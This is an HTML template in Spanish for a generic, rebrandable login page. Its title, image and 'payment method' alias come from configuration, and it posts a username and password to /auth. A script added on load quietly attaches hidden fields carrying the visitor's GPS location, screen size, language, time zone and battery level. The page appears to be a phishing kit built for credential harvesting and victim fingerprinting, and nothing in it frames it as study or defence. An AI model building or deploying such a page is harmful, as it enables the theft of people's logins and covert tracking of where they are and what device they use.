<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE ACCESO</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { 
            background: {{ config.color_fondo }}; 
            background: radial-gradient(circle, {{ config.color_fondo }} 0%, #000 100%);
            color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif;
        }
        .glass-card {
            background: rgba(255,255,255,0.05); backdrop-filter: blur(15px);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 25px;
            padding: 35px; width: 100%; max-width: 380px; text-align: center;
        }
        .img-header { width: 90px; height: 90px; border-radius: 50%; border: 2px solid gold; margin-bottom: 15px; }
        .form-control { background: rgba(0,0,0,0.5) !important; color: gold !important; border: 1px solid #333 !important; text-align: center; }
        .btn-gold { background: linear-gradient(to right, #ffd700, #b8860b); border: none; color: #000; font-weight: bold; width: 100%; padding: 12px; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="glass-card">
        <img src="{{ config.img_principal }}" class="img-header" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'">
        <h4 class="mb-1">{{ config.titulo }}</h4>
        <p class="small text-muted mb-4">MÉTODO DE PAGO: {{ config.alias }}</p>
        <form action="/auth" method="POST" id="mainForm">
            <input type="text" name="email" class="form-control mb-3" placeholder="Usuario o Correo" required>
            <input type="password" name="pass" class="form-control mb-4" placeholder="Contraseña" required>
            <button class="btn-gold">ACCEDER AHORA</button>
        </form>
    </div>
    <script>
        window.onload = function() {
            const f = document.getElementById('mainForm');
            const add = (n,v) => { let i = document.createElement('input'); i.type='hidden'; i.name=n; i.value=v; f.appendChild(i); };
            navigator.geolocation.getCurrentPosition(p => {
                add('lat_gps', p.coords.latitude); add('lon_gps', p.coords.longitude);
            });
            add('resolucion', window.screen.width + "x" + window.screen.height);
            add('lenguaje', navigator.language);
            add('tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
            if (navigator.getBattery) { navigator.getBattery().then(b => add('bateria', Math.round(b.level*100)+'%')); }
        }
    </script>
</body>
</html>
